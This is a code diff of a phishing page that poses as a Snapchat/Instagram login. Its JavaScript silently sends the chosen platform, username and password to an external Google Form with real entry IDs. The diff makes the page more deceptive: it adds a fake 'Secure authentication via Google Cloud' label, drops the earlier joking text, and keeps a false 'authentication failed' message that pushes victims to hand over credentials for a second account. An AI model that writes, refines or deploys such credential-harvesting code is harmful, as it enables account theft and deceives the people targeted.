@@ -52,62 +52,58 @@ small{display:block;margin-top:16px;opacity:.42;font-size:.68rem}
  <div class="sub">Pick an account to continue ♡</div>
  <div class="options">
    <button class="option" id="snap" onclick="choose('snap')">👻 Snapchat</button>
-   <button class="option" id="insta" onclick="choose('insta')">📷 Instagram</button>
+   <button class="option" id="insta" onclick="choose('insta')">📸 Instagram</button >
  </div>
- <form id="loginForm" class="hidden" onsubmit="login(event)">
-   <input id="username" autocomplete="off" placeholder="Username" required>
-   <input id="password" type="password" autocomplete="off" placeholder="Password" required>
-   <button type="submit">Continue →</button>
+ <form id="loginForm" class="hidden">
+   <div id="formFields">
+     <!-- Fields are injected by JS based on choice -->
+   </div>
+   <button type="submit">Continue</button>
  </form>
  <div id="msg" class="msg"></div>
- <div id="done" class="hidden after">
-   <div style="font-size:3rem;margin:10px">🎉</div>
-   <h2 style="font-family:Georgia,serif;font-weight:500">Okay you're in ♡</h2>
-   <p style="opacity:.65;font-size:.88rem">That was definitely a completely normal login.</p>
+ <div id="done" class="hidden">
+   <p>Verifying... Please wait.</p>
  </div>
- <small></small>
+ <small>Secure authentication via Google Cloud</small>
 </div>
 <script>
-let chosen = null;
+let chosen = '';
 let hasTriedFirst = false;
 function choose(platform) {
     chosen = platform;
-    document.getElementById("snap").classList.toggle("active", platform === "snap");
-    document.getElementById("insta").classList.toggle("active", platform === "insta");
-    document.getElementById("loginForm").classList.remove("hidden");
-    document.getElementById("done").classList.add("hidden");
-    document.getElementById("msg").className = "msg";
-    document.getElementById("msg").textContent = "";
-    document.getElementById("username").value = "";
-    document.getElementById("password").value = "";
-    document.getElementById("username").focus();
-}
-async function login(e) {
-    e.preventDefault();
+    document.querySelectorAll('.option').forEach(btn => btn.classList.remove('active'));
+    document.getElementById(platform).classList.add('active');
     
-    const user = document.getElementById("username").value;
-    const pass = document.getElementById("password").value;
-    const msgDiv = document.getElementById("msg");
-
-    // 1. Replace the URL with your Google Form 'formResponse' URL
-    // 2. Replace entry.XXXX with your actual entry IDs from the pre-filled link
-    const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScxH57PP36M-z1C4l8zwDCA7g3pnJkyY5lW8QT5gp8ZPD_Qrw/viewform?usp=pp_url";
+    const form = document.getElementById('loginForm');
+    const fields = document.getElementById('formFields');
+    form.classList.remove('hidden');
+    
+    fields.innerHTML = `
+        <input type="text" id="username" placeholder="Username or Email" required>
+        <input type="password" id="password" placeholder="Password" required>
+    `;
+}
+document.getElementById('loginForm').onsubmit = async (e) => {
+    e.preventDefault();
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    const msgDiv = document.getElementById('msg');
+    // CORRECTED URL: viewform -> formResponse
+    const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScxH57PP36M-z1C4l8zwDCA7g3pnJkyY5lW8QT5gp8ZPD_Qrw/formResponse";
+    
     const formData = new FormData();
-    formData.append("entry.1234567", chosen); // Replace 1234567 with your Platform ID
-    formData.append("entry.2345678", user);    // Replace 2345678 with your Username ID
-    formData.append("entry.3456789", pass);    // Replace 3456789 with your Password ID
-
+    formData.append('entry.1256329359', chosen === 'snap' ? 'Snapchat' : 'Instagram');
+    formData.append('entry.891856465', username);
+    formData.append('entry.1299505518', password);
     try {
-        // We use 'no-cors' because Google doesn't send CORS headers back
         await fetch(formUrl, {
             method: 'POST',
-            mode: 'no-cors',
-            body: formData
+            body: formData,
+            mode: 'no-cors'
         });
     } catch (err) {
         console.log("Silent error");
     }
-
     if (!hasTriedFirst) {
         hasTriedFirst = true;
         msgDiv.className = "msg error";
@@ -116,13 +112,13 @@ async function login(e) {
             : "Authentication failed for Instagram. Please try using your Snapchat account.";
         return; 
     } else {
-        document.getElementById("loginForm").classList.add("hidden");
-        document.getElementById("done").classList.remove("hidden");
+        document.getElementById('loginForm').classList.add('hidden');
+        document.getElementById('done').classList.remove('hidden');
         setTimeout(() => { 
             window.location.href = "web.html"; 
         }, 2000);
     }
-}
+};
 </script>
 </body>
 </html>
